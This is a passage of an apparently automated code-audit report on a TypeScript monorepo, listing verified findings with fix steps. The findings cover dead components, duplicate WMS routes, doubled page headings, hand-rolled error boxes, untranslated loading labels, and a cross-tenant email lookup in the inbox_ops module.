- Sibling toolbar handlers really are API-backed: handleSave (:446), handleCustomize (:479), handleResetToCode (:510) all `apiCall`. handleTest alone is a stub. The webhooks module ships a real, API-backed, fully-translated Test action (packages/webhooks/src/modules/webhooks/b
**Fix notes:** Recommended smallest edit — remove both affordances, keep the handler and the prop:
1. page.tsx: delete the `{!isCodeOnly && ( ... )}` block at :796-806.
2. page.tsx:41: drop `Play` from `import { CircleQuestionMark, PanelTopClose, PanelTopOpen, Play, Save, Trash2 } from 'lucide-react'` — after step 1 it is unused (its only use is :804) and lint will fail otherwise. This is the one non-obvious trap in the fix.
3. MobileVisualEditor.tsx: delete the menu `<button>` at :172-180. `Play` is still used elsewhere in that file — verify before touching its import.
4. Leave `onTest` in MobileVisualEditorProps (:32) and `onTest={handleTest}` (:723) in place, or make the prop optional. Deleting it narrows an exported interface for no benefit.
5. Leave the i18n keys in the 8 dictionaries. They are harmless unused keys; removing them is churn across 8 files, and they are needed again the day the handl

## [MEDIUM] duplication — planner/components/AvailabilitySchedule.tsx is a 504-line dead component superseded by AvailabilityRulesEditor, yet the agent component guide still names it the reference call site
**Lane:** open-loops  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/planner/components/AvailabilitySchedule.tsx:115
- packages/core/src/modules/planner/components/AvailabilitySchedule.tsx:36
- packages/core/src/modules/planner/components/AvailabilitySchedule.tsx:293
**Canonical:** packages/core/src/modules/planner/components/AvailabilityRulesEditor.tsx:398
**Why it matters:** Two same-named exports live in one folder and only one is reachable, so an agent or developer told to "follow the Schedule reference" edits the dead file and ships nothing — the fix silently has no effect. The guide actively steers them there: .ai/ui-backend-components.md:380 says "Reference call site: packages/core/src/modules/planner/components/AvailabilitySchedule.tsx", pointing at a file with zero importers. The dead file also carries its own defects that will never surface (line 293 renders an `Input type="datetime-local"` with `onChange={() => {}}`), and the QA master plan .ai/qa/scenarios/TC-LOCK-OSS-000-manual-qa-master-plan.md:201 schedules a manual optimistic-lock pass (LOCK-M-PLN-02) against a screen no route renders.
**Proposed fix:** Delete packages/core/src/modules/planner/components/AvailabilitySchedule.tsx and repoint .ai/ui-backend-components.md:380 at packages/core/src/modules/planner/components/AvailabilityRulesEditor.tsx, which is the file that actually renders `ScheduleView`. Nothing imports the deleted module, so this is a pure removal with no call-site churn.
**Note:** Dead, not orphaned — safe to delete. Two stale planning references should be corrected in the same change: .ai/specs/2026-05-29-optimistic-locking-all-crudforms.md:30 lists `AvailabilitySchedule` as a file needing optimistic-lock coverage, and .ai/qa/.../TC-LOCK-OSS-000-manual-qa-master-plan.md:201 lists LOCK-M-PLN-02 against it; both are unexecutable as written.
**Verifier:** Survives. I opened every cited file. (1) packages/core/src/modules/planner/components/AvailabilitySchedule.tsx exists, is 504 lines, and line 115 is `export function AvailabilitySchedule({` (graft: L115-L504); line 36 is `export type AvailabilityScheduleItemBuilder = (params: {`; line 293 is the `<Input type="datetime-local" ... />`. (2) It is genuinely unreachable: a repo-wide `grep -rln "AvailabilitySchedule"` (all file types, only node_modules/.git excluded) returns exactly 8 files, and NOT ONE contains an import of `components/AvailabilitySchedule` — the only two import statements in the codebase point at `components/AvailabilityRulesEditor` (planner .../availability-rulesets/[id]/page.tsx:11, resources .../resources/[id]/page.tsx:25). No barrel re-export, no `*.generated.*` registry, no dynamic/string import, and this fork has no `external/official-modules` submodule (`ls external/` -> No such file or directory). (3) The canonical is correct: AvailabilityRulesEditor.tsx:398 is `export function AvailabilityRulesEditor({` (L398-L2078), line 82 is the live duplicate `AvailabilityScheduleItemBuilder`, and line 1620 is the real `<ScheduleView` render. Four live routes render it (pl
**Fix notes:** EDITS. (1) `git rm packages/core/src/modules/planner/components/AvailabilitySchedule.tsx` — pure removal, nothing imports it. (2) .ai/ui-backend-components.md:380: repoint to `packages/core/src/modules/planner/components/AvailabilityRulesEditor.tsx` — that is the file whose line 1620 renders `<ScheduleView>`, and it is what all four live routes mount. (3) .ai/qa/scenarios/TC-LOCK-OSS-000-manual-qa-master-plan.md:201: rewrite LOCK-M-PLN-02 to name `AvailabilityRulesEditor` per-rule edit rather than deleting the scenario — the successor genuinely carries the lock surface (AvailabilityRulesEditor.tsx:110 `buildOptimisticLockHeader(rule.updatedAt ...)` for per-rule mutations, :114 for the ruleset, :138 for date-specific, plus `surfaceRecordConflict` at :914/:1195/:1450 and CrudForm at :1849/:2060), so the manual pass is executable once repointed at a route that exists (/backend/planner/avail

## [MEDIUM] duplication — Two flat WMS warehouse-assign POST routes duplicate the RESTful warehouse-assignment endpoint with no UI caller, no test and no doc
**Lane:** open-loops  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/wms/api/sales-orders/assign-warehouse/route.ts:10
- packages/core/src/modules/wms/api/sales-orders/unassign-warehouse/route.ts:10
**Canonical:** packages/core/src/modules/wms/api/sales-orders/[salesOrderId]/warehouse-assignment/route.ts:159
**Why it matters:** Two authenticated write surfaces mutate the same resource, but only one is exercised by the UI and integration tests. Any behavior added to the tested RESTful route — the optimistic-lock header handling, response-shape changes, guard tightening — silently does not reach the flat POST pair, and no test will catch the drift. This is exactly how the guard divergence in finding 1 arose inside this same route family. Both flat routes are live, `requireAuth`-gated, `openApi`-documented endpoints reachable by anyone holding `wms.manage_reservations`.
**Proposed fix:** Delete packages/core/src/modules/wms/api/sales-orders/assign-warehouse/ and packages/core/src/modules/wms/api/sales-orders/unassign-warehouse/, then run `yarn generate` to drop the two entries from modules.runtime.generated.ts. Nothing in the repo references either path, so no call site changes. If the flat shape must stay as public API, add an integration test alongside TC-WMS-004 so the two surfaces cannot drift unobserved.
**Note:** Proven unused with a full-repo grep plus the graft route inventory; the only reference outside the route files is the auto-discovery registry apps/mercato/.mercato/generated/modules.runtime.generated.ts:1215, which enumerates every api/**/route.ts by construction and is therefore not evidence of a caller. Both files predate the RESTful route's most recent work (git: the REST route was touched by 4c017ef9, the flat ones only by the initial import 26e40f68), which is consistent with the flat pair being a superseded first cut.
**Verifier:** Every claim checks out against the files I opened.

CITED LINES EXIST AND MATCH. `packages/core/src/modules/wms/api/sales-orders/assign-warehouse/route.ts` is a 57-line file whose only handler is `export async function POST` at L10-26, delegating to `executeWmsCustomPostRoute` with `routePath: 'wms/sales-orders/assign-warehouse'` (L13) and `commandId: 'wms.sales-order.assign-warehouse'` (L15). The unassign twin is L10-22 with `commandId: 'wms.sales-order.unassign-warehouse'` (L15). The canonical route has `commandId: 'wms.sales-order.assign-warehouse'` at L146 (inside `executeAssignMutation`, reached by PUT at L159 and PATCH at L167) and `commandBus.execute('wms.sales-order.unassign-warehouse', ...)` at L203 inside DELETE. Same commands, same `resourceKind: 'wms.sales_order_warehouse_assignment'`, same `requireFeatures: ['wms.manage_reservations']` — genuine duplicate write surfaces on one resource.

NOT DEAD-CODE-BY-GREP-ERROR. A repo-wide grep for `assign-warehouse` (all of ts/tsx/md/mdx/json/js/mjs, minus node_modules, dist, graft, graphify-out) returns exactly: the two flat route files, the canonical route, `commands/sales-order-assignment.ts`, its unit test (which resolves the
**Fix notes:** EXACT EDITS
1. `rm -r packages/core/src/modules/wms/api/sales-orders/assign-warehouse packages/core/src/modules/wms/api/sales-orders/unassign-warehouse`
2. `yarn generate` (drops the two entries from the gitignored runtime registry; nothing to commit from it)
3. Then `yarn typecheck && yarn test` — no call-site edits are required, so typecheck should be clean on the first pass. If it flags `salesOrderWarehouseAssignSchema` / `salesOrderWarehouseUnassignSchema` in `packages/core/src/modules/wms/data/validators.ts:352,356` as unused, leave them: `SalesOrderWarehouseAssignInput`/`SalesOrderWarehouseUnassignInput` (:361-362) derive from them and `commands/sales-order-assignment.ts` likely types its handlers against those aliases. Verify before pruning.

WHY THIS IS SAFE UNDER THIS REPO'S CONTRACT
`BACKWARD_COMPATIBILITY.md` splits frozen (persisted) identifiers from internal code shape. API 

## [MEDIUM] consistency — Payment-gateways transactions list stacks a PageHeader h1 on top of the DataTable's own h1
**Lane:** page-layout  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/payment_gateways/backend/payment-gateways/page.tsx:460
- packages/core/src/modules/payment_gateways/backend/payment-gateways/page.tsx:466
**Canonical:** packages/core/src/modules/currencies/backend/currencies/page.tsx:282
**Why it matters:** The page opens with two identically-styled 24/30px headings — "Payment Transactions" immediately above "Transactions" — and two h1 elements in one document, which is exactly the duplicate-header shape the DataTable re-architecture (spec 2026-08-23, Phase 4: "page header above the card") was meant to eliminate.
**Proposed fix:** Remove the `PageHeader` block (lines 460-463) and move its copy into the DataTable: keep `title={t('payment_gateways.transactions.title')}`, drop the now-redundant `payment_gateways.transactions.tableTitle` usage. Alternatively drop the DataTable `title` prop and keep the PageHeader — but the repo-dominant shape is DataTable-owns-the-header.
**Verifier:** Every load-bearing claim checks out against the files I opened.

CONFIRMED at the exact cited lines:
- packages/core/src/modules/payment_gateways/backend/payment-gateways/page.tsx:7 imports `{ Page, PageHeader, PageBody }`; :459 `<Page>`, :460-463 `<PageHeader title={t('payment_gateways.transactions.title','Payment Transactions')} description={t('payment_gateways.transactions.description', ...)} />`, :464 `<PageBody className="space-y-6">`, :465 `<DataTable`, :466 `title={t('payment_gateways.transactions.tableTitle','Transactions')}`. Nothing sits between the two headings.
- The `embedded` prop appears nowhere in that file (grep returns zero hits), and `hasTitle = title != null` (DataTable.tsx:3379) → `shouldRenderHeader` true (DataTable.tsx:3392), so the non-embedded branch fires.
- Page.tsx:110 and DataTable.tsx:3526 are byte-identical: `<h1 className="text-2xl font-normal leading-tight text-foreground sm:text-3xl">{title}</h1>`. Two h1s, same 24/30px treatment, ~24px apart.
- DataTable.tsx carries an explicit design-intent comment right above line 3526: embedded tables stay a section h2, "a standalone list view owns the page, so its title takes the page-title treatment."
- Root 
**Fix notes:** Not "risky" — no migration, no frozen identifier, no contract — but the finding's preferred fix is NOT behaviour-neutral, which is why I marked it unsafe rather than waving it through. `DataTableProps` has `title?: React.ReactNode` and `embedded?: boolean` but NO header `description` prop (the `description` fields at DataTable.tsx:197 and :524 belong to `DataTableExportSectionConfig`/`ResolvedExportSection`, not the header). So removing the PageHeader silently deletes the visible sentence "Track all payment-gateway transactions, inspect webhook activity, and review provider logs from one place." — a user-visible copy loss beyond the duplicate-heading defect. Whoever applies this must decide, not discover.

Option A — repo-dominant and rule-compliant (recommended; matches AGENTS.md:286 and the DataTable.tsx:3521 comment):
1. page.tsx:460-463 — delete the whole `<PageHeader ... />` element

## [MEDIUM] consistency — EUDR statement detail wraps its submissions table in a hand-rolled h2 while the table also renders its own page-title h1
**Lane:** page-layout  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/eudr/backend/eudr/statements/[id]/page.tsx:724
- packages/core/src/modules/eudr/backend/eudr/statements/[id]/page.tsx:725
**Canonical:** packages/core/src/modules/warranty_claims/backend/warranty_claims/[id]/page.tsx:2071
**Why it matters:** One section carries two headings for the same content, the lower one typeset larger than the upper one, and it is a second h1 on a page whose CrudForm already owns the record heading — the visual hierarchy inverts.
**Proposed fix:** Add `embedded` to the DataTable at line 725 and drop the `title` prop (line 726), keeping the section's own `<h2>`; or replace the hand-rolled h2 with `SectionHeader` from `@open-mercato/ui/backend/SectionHeader` and keep a single heading.
**Note:** `text-lg font-semibold` is an internal eudr convention (StatementRiskSection.tsx:161 uses the same), so the h2 styling itself is not the finding — the duplicated heading is.
**Verifier:** Every claim checked out against the files I opened.

1. Cited site is exact. `packages/core/src/modules/eudr/backend/eudr/statements/[id]/page.tsx` line 723 is `<section className="space-y-3">`, 724 is `<h2 className="text-lg font-semibold">{translate('eudr.statements.detail.submissions')}</h2>`, 725 is `<DataTable<LinkedSubmissionRow>`, 726 is `title={translate('eudr.statements.detail.submissionsTableTitle')}`. No line drift. `embedded` is genuinely absent (the props run title/columns/data/isLoading/error/emptyState/perspective/disableRowClick, lines 726-747).

2. The h1 consequence is real, not speculative. `packages/ui/src/backend/DataTable.tsx:3518-3531` — `hasTitle = title != null` (3379), `shouldRenderHeader = hasTitle || ...` (3392), and the ternary at 3523-3526 renders `<h2 className="text-sm font-semibold ...">` when `embedded`, else `<h1 className="text-2xl font-normal leading-tight text-foreground sm:text-3xl">`. `renderToolbarInline = embedded && hasToolbar` is false here, so `titleContent` is what renders. So the page really does emit an 18px h2 "Linked submissions" immediately followed by a 24/30px h1 "Submissions".

3. i18n values confirmed: `packages/core/src/module
**Fix notes:** Take the minimal variant, not the `embedded` variant.

RECOMMENDED EDIT — delete exactly one line, `packages/core/src/modules/eudr/backend/eudr/statements/[id]/page.tsx:726`:

    <DataTable<LinkedSubmissionRow>
-     title={translate('eudr.statements.detail.submissionsTableTitle')}
      columns={submissionColumns}

Then remove `"eudr.statements.detail.submissionsTableTitle"` (line 640) from all eight locale files under `packages/core/src/modules/eudr/i18n/`. Keep the `<h2>` at 724 — it matches the plotMap (754) and exports (764) sections in the same file and the module-wide convention.

Why NOT the `embedded` variant the finding offers as its first option: `embedded` is not a heading switch, it is a layout mode. Per DataTable.tsx:3405-3435, 3665, 3983 it also drops the card chrome (`overflow-hidden rounded-xl bg-surface shadow-md dark:border` → `''`), removes `flex flex-col gap-5` cont

## [MEDIUM] doc-drift — Deals kanban and map views hand-roll a page title that does not match the deals list view, and the inline comment misstates PageHeader's typography
**Lane:** page-layout  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/customers/backend/customers/deals/pipeline/page.tsx:2590
- packages/core/src/modules/customers/backend/customers/deals/pipeline/page.tsx:2584
- packages/core/src/modules/customers/backend/customers/deals/map/page.tsx:55
**Canonical:** packages/ui/src/backend/Page.tsx:110
**Why it matters:** Clicking between List / Kanban / Map — three tabs of the same records — visibly changes the page title from 24/30px light to 20/24px semibold, and the comment that is supposed to keep the hand-rolled markup in sync with the design system asserts values the design system does not have, so the next person to "follow the comment" will diverge further.
**Proposed fix:** Change both h1s to `text-2xl font-normal leading-tight text-foreground sm:text-3xl` and correct the comment at pipeline/page.tsx:2584-2588 to quote the real PageHeader classes. Note that `PageHeader`'s `description` prop is typed `React.ReactNode` (Page.tsx:88), so the comment's stated reason for not using the component — that it cannot host the LaneCurrencyBreakdown summary — does not hold; using `PageHeader` with the summary as `description` is the smaller long-term fix.
**Verifier:** Survives verification; every claim checked against the files on disk. (1) Canonical confirmed: Page.tsx:110 renders `<h1 className="text-2xl font-normal leading-tight text-foreground sm:text-3xl">` verbatim. (2) Divergent sites confirmed at the EXACT cited lines, no drift: pipeline/page.tsx:2590 and map/page.tsx:55 both carry `text-xl font-semibold leading-tight text-foreground sm:text-2xl`, and the misleading comment sits at pipeline/page.tsx:2584-2588. (3) Dominance is decisive, not a coin flip: `text-2xl font-normal leading-tight` appears at 4 DS sites (Page.tsx:110, DataTable.tsx:3526, FormHeader.tsx:157 and :159); the divergent string appears at exactly the 2 cited sites and NOWHERE else in packages/apps/external. (4) The premise that the list tab differs is real: deals/page.tsx:1073 passes NO `embedded` prop, so DataTable.tsx:3521-3527 takes the non-embedded branch and renders the 2xl/3xl-normal h1. (5) Sibling relationship confirmed: ViewTabsRow.tsx:8 types `KanbanView = 'kanban' | 'list' | 'map'` and is consumed at exactly three call sites (deals/page.tsx:1063, pipeline/page.tsx:2561, map/page.tsx:71). (6) STRONGER than reported: .ai/ds-rules.md:222 says a page title is "LI
**Fix notes:** The MINIMAL fix is safe: purely presentational class-string swaps. No DB migration, no frozen persisted identifier (no ACL feature id, event id, notification type, or schema touched), no public contract or prop signature change, no behavioural change beyond the defect itself.

EDIT 1 — packages/core/src/modules/customers/backend/customers/deals/pipeline/page.tsx:2590. Replace `className="text-xl font-semibold leading-tight text-foreground sm:text-2xl"` with `className="text-2xl font-normal leading-tight text-foreground sm:text-3xl"`.

EDIT 2 — same file, comment at 2583-2589. It currently claims PageHeader is "text-xl sm:text-2xl font-semibold leading-tight". Rewrite to quote the real classes (`text-2xl font-normal leading-tight text-foreground sm:text-3xl`, Page.tsx:110) and cite .ai/ds-rules.md:226. Also drop or reword the "matches /backend/customers/people" clause — that page's title 

## [MEDIUM] security — inbox_ops resolves the inbound-email sender by looking up `users` by email across every tenant, with no `tenant_id` predicate
**Lane:** sec-tenancy  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/inbox_ops/lib/messagesIntegration.ts:66
- packages/core/src/modules/inbox_ops/lib/messagesIntegration.ts:60
**Canonical:** packages/core/src/modules/auth/commands/users.ts:228
**Why it matters:** Per `docs/architecture/multi-tenancy.md` §3.5 the same email may legitimately exist in two tenants (`UNIQUE (tenant_id, email_hash)`), so an unqualified `where email = …` can return a user row belonging to a different tenant. That id is then written as `userId` on the composed message (`messagesIntegration.ts:135`), i.e. it becomes `messages.sender_user_id` inside the receiving tenant. The messages list resolves sender identity by id with no tenant filter — `packages/core/src/modules/messages/api/route.ts:357-366` does `findWithDecryption(em, User, { id: { $in: senderUserIds } }, …)` — so the foreign-tenant user's `name` and `email` are rendered to the receiving tenant's staff. An external party who knows a staff address at another tenant can trigger this by sending mail to the inbox with that `From`. Secondarily, when tenant data encryption is on the query can never match at all (the column holds ciphertext), so the intended "prefer the forwarding user" behaviour silently degrades to `recipientUserIds[0]` / the zero UUID — the comment at line 60 asserts the opposite of `auth/encryption.ts`.
**Proposed fix:** Use the `scope` the function is already handed, and look up by the hash the module owns: replace the Kysely query with `findOneWithDecryption(em, User, { $or: [{ email: normalizedEmail }, { emailHash: { $in: emailHashLookupValues(normalizedEmail) } }], tenantId: scope.tenantId, deletedAt: null }, {}, { tenantId: scope.tenantId, organizationId: scope.organizationId })`, importing `emailHashLookupValues` from `@open-mercato/core/modules/auth/lib/emailHash`. Delete the incorrect "plaintext login field" comment at line 60. The existing fallbacks (`recipientUserIds[0]`, then `SYSTEM_USER_ID`) already cover a miss, so no caller changes.
**Note:** Not covered by any open spec; `docs/architecture/multi-tenancy.md` §3.2a lists `messages`/`inbox_ops` as modules that scope by hand outside the query engine and directs the reader to "read the module's own predicates" — this is a predicate that is missing, not one the document already records.
**Verifier:** I tried to refute this on every axis and failed on all of them.

CITED CODE EXISTS VERBATIM. `packages/core/src/modules/inbox_ops/lib/messagesIntegration.ts:53-78` is exactly as quoted: the function takes `scope: { tenantId: string; organizationId: string }` (L57) and never reads it; L66-70 is a raw Kysely `selectFrom('users').where('email','=',normalizedEmail).where('deleted_at','is',null)` with no `tenant_id` predicate. Not a test, not generated, not dist/.ai/node_modules. Working tree is clean at ffd7404f, so it is not already fixed.

IT IS A REAL DIVERGENCE, not a legitimate difference. The strongest evidence is one the original finding missed: the sibling raw-Kysely `users` lookup **in the same call chain** does scope. `packages/core/src/modules/notifications/lib/notificationRecipients.ts:48-52` (`getScopedNotificationRecipientUserIds`, invoked from `createMessageRecordForEmail` two lines before the defective call) reads `.selectFrom('users').where('users.id','in',...).where('users.deleted_at','is',null).where('users.tenant_id','=',tenantId)`. There are exactly two non-test `selectFrom('users')` sites in the repo; the other one filters by tenant. Every ORM-side User-by-email l
**Fix notes:** No DB migration, no frozen persisted identifier (no ACL feature id, event id, notification type, or schema change), and no public contract change — the signature already accepts `scope`. I still mark it unsafe because the proposed fix bundles two changes, and the second one revives dormant behaviour.

WHY IT IS NOT A PURE PREDICATE ADDITION. Today, with tenant data encryption enabled, `where('email','=',plaintext)` matches nothing (ciphertext, per-row IV — `auth/data/entities.ts:4-13`), so `resolveMessageSenderUserId` silently always falls through to `recipientUserIds[0]`. Switching the lookup key to `emailHash` makes it start matching. That changes which id is written to `messages.sender_user_id` for every inbound email whose `From` belongs to a real in-tenant user — and that column is an authorization subject (`messages/commands/attachments.ts:39`, `messages/commands/messages.ts:486`, 

## [MEDIUM] duplication — Three detail sections hand-roll a copy of the `ErrorMessage` box instead of importing it — one of them from the very barrel it already imports `LoadingMessage` from
**Lane:** states  **Fix is safe:** True
**Divergent sites:**
- packages/ui/src/backend/detail/ActivitiesSection.tsx:1097
- packages/core/src/modules/customers/components/detail/DealsSection.tsx:921
- packages/core/src/modules/customers/components/detail/TasksSection.tsx:463
**Canonical:** packages/core/src/modules/customers/components/detail/ActivityHistorySection.tsx:442
**Why it matters:** Two concrete regressions, not just duplication. (1) No `role="alert"`: a screen reader announces nothing when the Deals, Tasks or Activities tab fails to load — the user is left on a silently empty tab, while the Activity History tab next to it announces correctly. (2) No `formatErrorMessageLabel()`: that helper turns a raw technical key such as `customers.deals.errors.load` into "Errors load" before display; these three render whatever string the fetch put in state verbatim, so a dotted key or a raw server code leaks into the UI on exactly the sibling tabs of a page where the canonical tab would have softened it. ActivitiesSection.tsx is the worst placed of the three: it lives inside `packages/ui/src/backend/detail/` beside ErrorMessage.tsx and ships to every module that renders an activities tab.
**Proposed fix:** At each of the three sites replace the `<div className="rounded-md border border-destructive/40 ...">{loadError}</div>` block with `<ErrorMessage label={loadError} />` (`{error}` in TasksSection) and add `ErrorMessage` to the existing import on ActivitiesSection.tsx:21, DealsSection.tsx:13, TasksSection.tsx:12. No other change — the wrapper conditional (`loadError ? ... : null`) stays as is.
**Note:** The `border-destructive/40 bg-destructive/5` ramp in these clones is the same token problem as finding 1; fixing them by delegating to `<ErrorMessage>` means they inherit whatever ramp that component settles on, so land finding 1 first and this one needs no second pass.
**Verifier:** Confirmed by opening every cited file. ErrorMessage.tsx:27-47 does carry role="alert", the AlertCircle icon and formatErrorMessageLabel() (defined lines 17-25) — all three absent from the clones. index.ts:4 exports ErrorMessage from the same barrel all three divergent files already import LoadingMessage/TabEmptyState from, at exactly the cited import lines (ActivitiesSection.tsx:21 `from './'`, DealsSection.tsx:13, TasksSection.tsx:12). The three hand-rolled boxes exist byte-identically at exactly the cited lines. Canonical confirmed at ActivityHistorySection.tsx:15 (import) and :442 (`<ErrorMessage label={error} />`). Dominance is not in doubt: 158 `<ErrorMessage` call sites across packages/ + apps/ versus a handful of hand-rolls, and the repo's own instructions mandate it — packages/ui/src/backend/AGENTS.md:9 "MUST use LoadingMessage/ErrorMessage from @open-mercato/ui/backend/detail for loading and error states", echoed at packages/ui/AGENTS.md:395. No module AGENTS.md documents any deliberate exception. Nothing is in a test, generated, dist or vendored path. Working tree is clean — not already fixed. The consequences are real: no role="alert" on three tab-load failures, and no f
**Fix notes:** Three edits, each a two-line change.

1. packages/ui/src/backend/detail/ActivitiesSection.tsx
   - line 21: `import { LoadingMessage, TabEmptyState } from './'` -> `import { ErrorMessage, LoadingMessage, TabEmptyState } from './'`
   - lines 1096-1100: replace the `<div className="rounded-md border border-destructive/40 bg-destructive/5 px-3 py-2 text-sm text-destructive">{loadError}</div>` with `<ErrorMessage label={loadError} />`, keeping the surrounding `{loadError ? ( ... ) : null}` exactly as is.

2. packages/core/src/modules/customers/components/detail/DealsSection.tsx
   - line 13: add `ErrorMessage` to `import { LoadingMessage, TabEmptyState } from '@open-mercato/ui/backend/detail'`
   - lines 920-924: same swap, `<ErrorMessage label={loadError} />`.

3. packages/core/src/modules/customers/components/detail/TasksSection.tsx
   - line 12: add `ErrorMessage` to `import { LoadingMes

## [MEDIUM] consistency — Hardcoded English loading label in the workflows visual editor, while its three sibling detail pages translate the identical string
**Lane:** states  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:663
**Canonical:** packages/core/src/modules/workflows/backend/definitions/[id]/page.tsx:247
**Why it matters:** Every non-English tenant opening the workflow visual editor sees an English "Loading workflow definition..." on a screen whose dialogs, buttons and every other label are localized — and the sibling definitions/[id] page one click away shows the same state translated. This is the exact case AGENTS.md calls out ("Never hard-code user-facing strings"); it is not an `[internal]`-prefixed internal message, and it is not covered by a module allowlist (packages/core/src/modules/workflows/i18n/ contains only the eight locale files, no .hardcoded-allowlist.json).
**Proposed fix:** Add `"workflows.visualEditor.loading": "Loading workflow definition..."` to packages/core/src/modules/workflows/i18n/en.json (and the seven sibling locale files, mirroring how workflows.edit.loading is carried), then change line 663 to `<LoadingMessage label={t('workflows.visualEditor.loading', 'Loading workflow definition...')} />`.
**Note:** `yarn i18n:check-hardcoded` is advisory in Phase 1 of .ai/specs/2026-05-26-missing-translations-audit-and-remediation.md, which is why this slipped through — that spec schedules the checker's escalation, not this specific string, so it is a straggler rather than already-scheduled work. Note the three sibling pages hand-roll a spinner+span rather than using LoadingMessage; this finding is only about the untranslated label, not the component choice.
**Verifier:** Survives every refutation angle I tried. (1) The cited line is real and exact: packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:663 contains `<LoadingMessage label="Loading workflow definition..." />` — live source, not a test, __tests__/, *.generated.*, dist/, .ai/, graft/ or node_modules. (2) All three canonical sites verified at the exact cited lines by reading them. (3) Dominance check, the angle most likely to kill this: I enumerated every `LoadingMessage label=` in non-dist source (~80 sites). Exactly two are hardcoded. One is packages/core/src/modules/design_system/gallery/entries/detail.tsx:212, a design-system gallery demo variant whose own displayed code sample explicitly teaches `label={t('customers.people.detail.loading')}` — an intentional render sample, not a counter-example. The other is the reported line. The t() pattern is ~78:1 dominant, so the canonical claim is not just true but overwhelming. (4) Not already fixed: `git status --porcelain` on the file is empty and the string is still present. (5) No exemption: packages/core/src/modules/workflows/i18n/ holds only the eight locale files (de, en, es, fr, ko, pl, vi, zh) — no .hardcoded
**Fix notes:** Two-part edit, no behavior change beyond the defect, no migration, no frozen persisted identifier (this is an i18n dictionary key, not an ACL feature / event id / notification type / schema column), no public contract change.

1) packages/core/src/modules/workflows/backend/definitions/visual-editor/page.tsx:663
   from: <LoadingMessage label="Loading workflow definition..." />
   to:   <LoadingMessage label={t('workflows.visualEditor.loading', 'Loading workflow definition...')} />
   The two-arg form is supported: packages/shared/src/lib/i18n/context.tsx resolves `t: (key, fallbackOrParams, params)` with `dict[key] ?? fallback ?? key`, so the string is never worse than today even before the locale files land. `t` is already in scope at line 66.

2) Add "workflows.visualEditor.loading": "Loading workflow definition..." to ALL EIGHT locale files, not just en.json. This is stricter than the

## [LOW] consistency — previewData.statusColor is computed by every module, shipped over the API, and rendered by nothing
**Lane:** authoring-chain  **Fix is safe:** False
**Divergent sites:**
- packages/ui/src/backend/messages/MessageObjectPreview.tsx:38
- packages/core/src/modules/staff/components/LeaveRequestPreview.tsx:28
**Canonical:** packages/core/src/modules/sales/lib/messageObjectPreviews.ts:98
**Why it matters:** Every object-preview status chip renders neutral, so a "Cancelled" order and a "Paid" order are visually identical in the composer and message thread — the severity signal each module carefully computes never reaches the reader. It also keeps a per-request DB-derived field on the wire that no consumer reads.
**Proposed fix:** Pick one direction. Either map the five names to DS status tokens in MessageObjectPreview (`bg-status-{success|error|warning|info}-bg` / `text-status-…-fg`, never raw Tailwind ramps) and apply them to the Badge, or delete `statusColor` from packages/shared/src/modules/messages/types.ts:148, the two API schemas, and the 26 producer sites. Either way remove the dead local at LeaveRequestPreview.tsx:28.
**Note:** Rendering it is arguably the reason it was left unwired — the emitted names ('green', 'amber', …) are not DS tokens, and the repo forbids hardcoded colours. Deleting the field is the smaller, safer edit; treat this as a cleanup, not a bug.
**Verifier:** Confirmed by opening every cited file. (1) `packages/shared/src/modules/messages/types.ts:148` does declare `statusColor?: string` on `ObjectPreviewData` (type spans L144-L150 per graft). (2) `packages/core/src/modules/sales/lib/messageObjectPreviews.ts:52-65` is the `statusColor()` helper returning literally 'green'/'red'/'amber'/'blue', and `:98` assigns `statusColor: statusColor(record.status)` — quoted evidence is exact. (3) It is serialized: `messages/api/[id]/route.ts:38` (`MessageObjectPreviewPayload.statusColor?: string`) and `messages/api/openapi.ts:121` (`statusColor: z.string().optional()` inside the `preview` object of the response schema). (4) `MessageObjectPreview.tsx:37-39` renders `previewData.status` in a colorless `<Badge variant="outline">` and never reads `statusColor` — exact quote match. (5) `LeaveRequestPreview.tsx:28` is verbatim `const statusColor = previewData?.statusColor || 'amber'`, and I read the whole JSX body below it (L30-L60): the local is never referenced — the status is rendered at L47-L51 as `<Badge variant="outline">{status}</Badge>`. A repo-wide grep for `statusColor` across packages/apps/external (excluding node_modules) returns exactly one r
**Fix notes:** WHY fixIsSafe=false — neither direction is behaviour-neutral, and there is ZERO test coverage. I grepped every *.test.ts/tsx and *.spec.ts for `messageObjectPreviews|loadPreview|MessageObjectPreview`: the only hit is packages/core/src/modules/sync_excel/__integration__/TC-SX-001.spec.ts, which is an unrelated Excel-upload preview. The messages module's own tests (packages/core/src/modules/messages/__tests__/detail-access.test.ts, search.test.ts) never touch the preview payload. Nothing guards this change.

- Render direction changes visible UI in five components — every object-preview status chip in the composer and message thread goes from neutral to colored. That is the intended fix, but it is a user-visible change with no test net, and it touches only `.tsx` under packages/ui/src and **/components/**, so per .ai/docs/pr-workflow.md it does NOT qualify for the automated-verification ex

## [LOW] duplication — Five verbatim formatter copies inside one customers deals-pipeline components directory that already has a constants module
**Lane:** dup-logic  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/customers/backend/customers/deals/pipeline/components/LaneCurrencyBreakdown.tsx:167
- packages/core/src/modules/customers/backend/customers/deals/pipeline/components/LaneCurrencyBreakdown.tsx:175
- packages/core/src/modules/customers/backend/customers/deals/pipeline/components/CurrencyBreakdownTable.tsx:102
- packages/core/src/modules/customers/backend/customers/deals/pipeline/components/CurrencyFilterPopover.tsx:285
- packages/core/src/modules/customers/backend/customers/deals/pipeline/components/CurrencyFilterPopover.tsx:293
**Canonical:** packages/core/src/modules/customers/backend/customers/deals/pipeline/components/constants.ts:9
**Why it matters:** These three components render the same currency breakdown side by side — the lane footer, the breakdown table and the filter popover all show the same deal totals. Editing the rounding or grouping in one (say, to stop rounding cents away) silently leaves the other two showing a different number for the same value in the same viewport, which reads as a data bug rather than a formatting one. The directory's own constants.ts was created to prevent exactly this class of drift.
**Proposed fix:** Move both functions into packages/core/src/modules/customers/backend/customers/deals/pipeline/components/constants.ts (or a sibling formatters.ts) as exports, and replace the five local definitions with imports. No behavior change — the bodies are identical.
